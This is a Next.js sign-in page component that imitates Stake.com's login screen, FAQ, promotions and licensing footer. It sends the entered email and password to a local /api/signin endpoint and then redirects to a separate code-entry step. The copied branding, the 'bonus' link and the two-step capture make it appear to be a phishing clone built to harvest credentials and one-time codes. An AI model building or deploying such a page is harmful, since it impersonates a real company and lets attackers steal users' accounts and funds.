"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { 
  X, 
  Eye, 
  EyeOff, 
  Key, 
  ChevronDown, 
  ChevronUp, 
  Lock, 
  Shield, 
  Globe, 
  Gamepad2, 
  Trophy, 
  HelpCircle,
  TrendingUp
} from "lucide-react";
import { useRouter } from "next/navigation";
import StakeTransition from "../component/StakeTransition";
import StakeLogo from "../component/StakeLogo";

export default function SignInPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showTransition, setShowTransition] = useState(true);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // FAQ Accordion state
  const [expandedFaq, setExpandedFaq] = useState<number | null>(0); // Default first item open

  // Active Category Tab
  const [activeTab, setActiveTab] = useState("Casino Games");

  const router = useRouter();

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowTransition(false);
    }, 2000); // 2 seconds splash transition
    return () => clearTimeout(timer);
  }, []);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setError("Please fill in all fields");
      return;
    }
    setError("");
    setLoading(true);

    try {
      const res = await fetch("/api/signin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.status || "Something went wrong");
        setLoading(false);
        return;
      }

      localStorage.setItem("userId", data.userId);
      router.push("/signin/code");
    } catch (err) {
      setError("Unable to connect to server");
    } finally {
      setLoading(false);
    }
  };

  const toggleFaq = (index: number) => {
    setExpandedFaq(expandedFaq === index ? null : index);
  };

  const faqs = [
    {
      q: "What is Stake?",
      a: "Stake is a leading online crypto casino and sports betting platform. It offers a wide range of casino games, including slots, table games, and live dealer games, as well as sports betting options for major sporting events around the world. Stake supports a variety of cryptocurrencies, allowing players to make secure and instant deposits and withdrawals."
    },
    {
      q: "Is Stake Licensed?",
      a: "Yes, Stake is operated by Medium Rare N.V., a company licensed and regulated by the Government of Curaçao. This ensures that the platform operates fairly, securely, and transparently, adhering to strict international gaming standards."
    },
    {
      q: "Is Betting on Stake Safe?",
      a: "Absolutely. Stake uses advanced security protocols, including SSL encryption and two-factor authentication (2FA), to protect user accounts and data. In addition, all games are provably fair, meaning you can verify the randomness and fairness of every bet."
    },
    {
      q: "What Currencies Can Be Used?",
      a: "Stake is a crypto-first platform supporting popular cryptocurrencies such as Bitcoin (BTC), Ethereum (ETH), Litecoin (LTC), Dogecoin (DOGE), Ripple (XRP), Tron (TRX), and many others. You can also purchase crypto directly on the site using local fiat payment methods."
    },
    {
      q: "What Types of Casino Games Can I Play?",
      a: "Stake offers thousands of games, including original games (like Plinko, Mines, Crash, Limbo, and Dice), popular slot titles from leading providers, live blackjack, roulette, baccarat, and game shows."
    },
    {
      q: "What Sports Can I Bet On?",
      a: "Stake sports betting covers a massive array of sports including soccer, tennis, basketball, American football, baseball, MMA, esports, and niche sporting events, with both pre-match and live in-play betting options."
    },
    {
      q: "How Can I Contact the Support?",
      a: "Stake provides 24/7 customer support via live chat and email. The support team is highly responsive and ready to help with account, deposit, withdrawal, or game questions."
    }
  ];

  const liveGames = [
    { name: "Plinko", payout: "x1,000.00", color: "#10B981" },
    { name: "Mines", payout: "x2.50", color: "#10B981" },
    { name: "Crash", payout: "x1.80", color: "#10B981" },
    { name: "Wheel", payout: "x1.50", color: "#10B981" },
    { name: "Dice", payout: "x1.20", color: "#10B981" },
    { name: "Limbo", payout: "x4.50", color: "#10B981" },
    { name: "Roulette", payout: "x2.00", color: "#10B981" }
  ];

  return (
    <>
      {showTransition && <StakeTransition />}

      <div className="min-h-screen bg-[#1A2732] flex flex-col items-center">
        {/* Main Content Container (Mobile-first width limit) */}
        <div className="w-full max-w-[480px] bg-[#1A2732] min-h-screen flex flex-col">
          
          {/* 1. SIGN IN FORM CARD */}
          <div className="bg-[#1A2732] p-5 border-b border-[#2C3B49]">
            {/* Header */}
            <div className="flex justify-between items-center mb-6">
              <div className="flex items-center gap-2 text-white font-extrabold text-[18px]">
                <Lock size={18} className="text-white" />
                Sign In
              </div>
              <Link href="/bonus" className="text-[#8E9CA7] hover:text-white transition-colors">
                <X size={22} />
              </Link>
            </div>

            {/* Inputs Form */}
            <form onSubmit={handleSignIn} className="space-y-4">
              <div>
                <label className="block text-[#8E9CA7] text-[13px] font-bold mb-2">
                  Email or Username <span className="text-[#FE2247]">*</span>
                </label>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-[#0B1319] border border-[#2C3B49] rounded-[4px] px-3 py-[10px] text-white text-[14px] focus:outline-none focus:border-[#3861FB] transition-colors"
                  required
                />
              </div>

              <div>
                <label className="block text-[#8E9CA7] text-[13px] font-bold mb-2">
                  Password <span className="text-[#FE2247]">*</span>
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full bg-[#0B1319] border border-[#2C3B49] rounded-[4px] px-3 py-[10px] pr-10 text-white text-[14px] focus:outline-none focus:border-[#3861FB] transition-colors"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[#8E9CA7] hover:text-white"
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              <div className="text-left">
                <Link href="#" className="text-[#3861FB] hover:underline text-[12px] font-bold">
                  Forgot Password?
                </Link>
              </div>

              {error && (
                <div className="text-[#FE2247] bg-[#FE2247]/10 border border-[#FE2247]/20 text-[12px] p-[10px] rounded-[4px] font-semibold text-center">
                  {error}
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#3861FB] hover:bg-[#2E52E0] disabled:opacity-60 text-white font-bold py-[11px] rounded-[4px] text-[14px] transition-colors shadow-md"
              >
                {loading ? "Signing In..." : "Sign In"}
              </button>
            </form>

            <div className="flex items-center my-4">
              <div className="flex-1 border-t border-[#2C3B49]"></div>
              <span className="px-3 text-[#8E9CA7] text-[11px] font-bold uppercase tracking-wider">or</span>
              <div className="flex-1 border-t border-[#2C3B49]"></div>
            </div>

            {/* SSO / Alt login buttons */}
            <div className="space-y-[10px] mb-6">
              <button className="w-full bg-[#2A3B49] hover:bg-[#344859] text-white text-[13px] font-bold py-[10px] rounded-[4px] transition-colors flex items-center justify-center gap-2 border border-[#3A4E5E]">
                <Key size={16} />
                Sign In with passkey
              </button>
              <button className="w-full bg-[#2A3B49] hover:bg-[#344859] text-white text-[13px] font-bold py-[10px] rounded-[4px] transition-colors flex items-center justify-center gap-2 border border-[#3A4E5E]">
                <svg className="w-[16px] h-[16px]" viewBox="0 0 24 24">
                  <path
                    fill="#EA4335"
                    d="M12.24 10.285V14.4h6.887c-.275 1.565-1.88 4.604-6.887 4.604-4.33 0-7.859-3.578-7.859-8s3.53-8 7.859-8c2.46 0 4.105 1.025 5.047 1.926l3.245-3.123C18.25 1.91 15.495 1 12.24 1 6.033 1 1 6.033 1 12.24s5.033 11.24 11.24 11.24c6.478 0 10.793-4.537 10.793-10.985 0-.746-.08-1.32-.176-1.92H12.24z"
                  />
                </svg>
                Sign In with Google
              </button>
              <button className="w-full bg-[#2A3B49] hover:bg-[#344859] text-white text-[13px] font-bold py-[10px] rounded-[4px] transition-colors border border-[#3A4E5E]">
                Sign In another way
              </button>
            </div>

            {/* Register Account Footer */}
            <div className="text-center text-[13px]">
              <span className="text-[#8E9CA7]">Don&apos;t have an account? </span>
              <Link href="#" className="text-white hover:underline font-bold ml-1">
                Register an Account
              </Link>
            </div>
          </div>

          {/* 2. ATHLETES / SPORTS SLIDES */}
          <div className="p-4 grid grid-cols-3 gap-2 border-b border-[#2C3B49]">
            {/* Soccer Card */}
            <div className="h-[90px] rounded-[6px] bg-gradient-to-br from-[#1E3A8A] to-[#3B82F6] p-2 flex flex-col justify-between relative overflow-hidden shadow-md">
              <span className="text-white text-[11px] font-extrabold tracking-wider z-10">SOCCER</span>
              <div className="absolute right-[-10px] bottom-[-10px] opacity-25">
                <Trophy size={60} className="text-white" />
              </div>
            </div>
            {/* Tennis Card */}
            <div className="h-[90px] rounded-[6px] bg-gradient-to-br from-[#5B21B6] to-[#8B5CF6] p-2 flex flex-col justify-between relative overflow-hidden shadow-md">
              <span className="text-white text-[11px] font-extrabold tracking-wider z-10">TENNIS</span>
              <div className="absolute right-[-10px] bottom-[-10px] opacity-25">
                <TrendingUp size={60} className="text-white" />
              </div>
            </div>
            {/* Baseball Card */}
            <div className="h-[90px] rounded-[6px] bg-gradient-to-br from-[#7C2D12] to-[#F97316] p-2 flex flex-col justify-between relative overflow-hidden shadow-md">
              <span className="text-white text-[11px] font-extrabold tracking-wider z-10">BASEBALL</span>
              <div className="absolute right-[-10px] bottom-[-10px] opacity-25">
                <Gamepad2 size={60} className="text-white" />
              </div>
            </div>
          </div>
          <div className="text-center py-2 bg-[#1A2732]">
            <button className="text-white hover:underline text-[12px] font-bold">View More</button>
          </div>

          {/* 3. PROMOTIONS SECTION */}
          <div className="p-4 border-b border-[#2C3B49]">
            <div className="flex justify-between items-center mb-3">
              <span className="text-white font-extrabold text-[15px] flex items-center gap-2">
                <Shield size={16} className="text-yellow-500" />
                Promotions
              </span>
              <button className="text-[#8E9CA7] hover:text-white text-[12px] font-bold">View All</button>
            </div>

            {/* Promotion card */}
            <div className="bg-[#0B1319] border border-[#2C3B49] rounded-[6px] p-4 flex justify-between items-center gap-3">
              <div className="flex-1">
                <span className="bg-[#2D3A4A] text-white text-[9px] font-extrabold px-2 py-1 rounded-[4px] tracking-wider">OFFICIAL</span>
                <h4 className="text-white text-[13px] font-bold mt-2 mb-1 leading-snug">
                  Settle in for a Start-to-Finish Win
                </h4>
                <Link href="#" className="text-[#3861FB] text-[11px] font-bold hover:underline">
                  Learn More
                </Link>
              </div>
              <div className="w-[60px] h-[60px] bg-gradient-to-br from-yellow-400 to-amber-600 rounded-[6px] flex items-center justify-center flex-shrink-0 shadow-lg">
                <Shield size={36} className="text-white drop-shadow-md" />
              </div>
            </div>
          </div>
          <div className="text-center py-2 bg-[#1A2732] border-b border-[#2C3B49]">
            <button className="text-white hover:underline text-[12px] font-bold">Learn More</button>
          </div>

          {/* 4. TABS & PAYOUTS TABLE */}
          <div className="p-4 border-b border-[#2C3B49]">
            {/* Category tabs */}
            <div className="flex bg-[#0B1319] p-1 rounded-[6px] mb-4 border border-[#2C3B49]">
              {["Casino Games", "Sports Bets", "Promo Conditions"].map((tab) => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`flex-1 text-[11px] font-bold py-2 rounded-[4px] transition-all whitespace-nowrap text-center ${
                    activeTab === tab 
                      ? "bg-[#2A3B49] text-white shadow-sm" 
                      : "text-[#8E9CA7] hover:text-white"
                  }`}
                >
                  {tab}
                </button>
              ))}
            </div>

            {/* Live payout table mock */}
            <div className="flex justify-between items-center mb-3">
              <span className="text-[#8E9CA7] text-[11px] font-bold uppercase tracking-wider">Game</span>
              <span className="text-[#8E9CA7] text-[11px] font-bold uppercase tracking-wider">Live Payout</span>
            </div>
            
            <div className="space-y-[6px]">
              {liveGames.map((game) => (
                <div 
                  key={game.name} 
                  className="flex justify-between items-center bg-[#0B1319] border border-[#1C2C39]/80 rounded-[4px] py-[10px] px-3"
                >
                  <span className="text-white text-[13px] font-bold flex items-center gap-2">
                    <span className="w-1.5 h-1.5 bg-[#4BDE80] rounded-full inline-block"></span>
                    {game.name}
                  </span>
                  <span className="text-[#4BDE80] text-[12px] font-extrabold font-mono">
                    {game.payout}
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* 5. STILL HAVE QUESTIONS (FAQ ACCORDION) */}
          <div className="p-4 border-b border-[#2C3B49]">
            <h3 className="text-white font-extrabold text-[15px] mb-4 flex items-center gap-2">
              <HelpCircle size={16} />
              Still Have Questions?
            </h3>

            <div className="space-y-[8px]">
              {faqs.map((faq, idx) => {
                const isOpen = expandedFaq === idx;
                return (
                  <div 
                    key={idx} 
                    className="bg-[#0B1319] border border-[#1C2C39] rounded-[6px] overflow-hidden"
                  >
                    <button
                      onClick={() => toggleFaq(idx)}
                      className="w-full flex justify-between items-center py-3 px-4 text-left focus:outline-none"
                    >
                      <span className="text-white text-[13px] font-bold">{faq.q}</span>
                      {isOpen ? (
                        <ChevronUp size={16} className="text-[#8E9CA7]" />
                      ) : (
                        <ChevronDown size={16} className="text-[#8E9CA7]" />
                      )}
                    </button>
                    {isOpen && (
                      <div className="px-4 pb-3 text-[#8E9CA7] text-[12px] leading-relaxed border-t border-[#1C2C39] pt-2">
                        {faq.a}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>

          {/* 6. FOOTER ACCORDIONS */}
          <div className="p-4 bg-[#0B1319] border-b border-[#2C3B49]">
            <div className="space-y-[8px]">
              {["Casino", "Sports", "Support", "About Us", "Page and Info", "FAQ"].map((category) => (
                <div 
                  key={category} 
                  className="flex justify-between items-center py-[10px] border-b border-[#1C2C39]/80 cursor-pointer"
                >
                  <span className="text-white text-[13px] font-bold">{category}</span>
                  <ChevronDown size={16} className="text-[#8E9CA7]" />
                </div>
              ))}
            </div>

            {/* Social Icons row */}
            <div className="flex justify-center gap-5 my-6 text-[#8E9CA7]">
              {["𝕏", "✈", "f", "📷", "▶", "♪"].map((icon, index) => (
                <span 
                  key={index} 
                  className="hover:text-white cursor-pointer text-[16px] font-extrabold transition-colors"
                >
                  {icon}
                </span>
              ))}
            </div>

            {/* Licensing & Info texts */}
            <div className="text-center text-[10px] text-[#55697A] leading-relaxed space-y-3 px-2">
              <p>Stake.com is owned and operated by Medium Rare N.V., registration number: 145353.</p>
              <p>
                Contact us at support@stake.com. Stake is authorized and regulated by the Government of Curaçao under License No. 8048/JAZ.
              </p>
              <p>© 2026 Stake.com. All rights reserved.</p>

              {/* Language selection */}
              <div className="flex justify-center py-2">
                <button className="flex items-center gap-1 bg-[#1A2732] border border-[#2C3B49] text-white text-[11px] font-bold py-1.5 px-3 rounded-[4px]">
                  <Globe size={12} />
                  English
                  <ChevronDown size={10} />
                </button>
              </div>
            </div>
          </div>

          {/* 7. BRANDS & LICENSE LOGOS (BOTTOM MOST) */}
          <div className="bg-[#0B1319] py-8 px-4 flex flex-col items-center gap-6">
            {/* Stake Logo */}
            <StakeLogo className="w-20 h-auto text-white opacity-40" />

            {/* Verification & License badges */}
            <div className="flex items-center gap-3">
              <div className="border border-[#2C3B49] rounded-[4px] px-3 py-1 bg-[#1A2732] text-[10px] text-white font-extrabold flex items-center gap-1 opacity-60">
                <Shield size={10} className="text-yellow-500" />
                VERIFIED OPERATOR
              </div>
              <div className="border border-[#2C3B49] rounded-[4px] px-3 py-1 bg-[#1A2732] text-[10px] text-white font-extrabold flex items-center gap-1 opacity-60">
                18+
              </div>
            </div>

            {/* Curaçao gaming commission logo mockup */}
            <div className="flex items-center gap-1.5 text-[#55697A] text-[9px] font-bold tracking-wider opacity-60">
              <span className="w-4 h-4 bg-[#22C55E] rounded-full inline-block"></span>
              CURAÇAO E-GAMING
            </div>
          </div>

        </div>
      </div>
    </>
  );
}
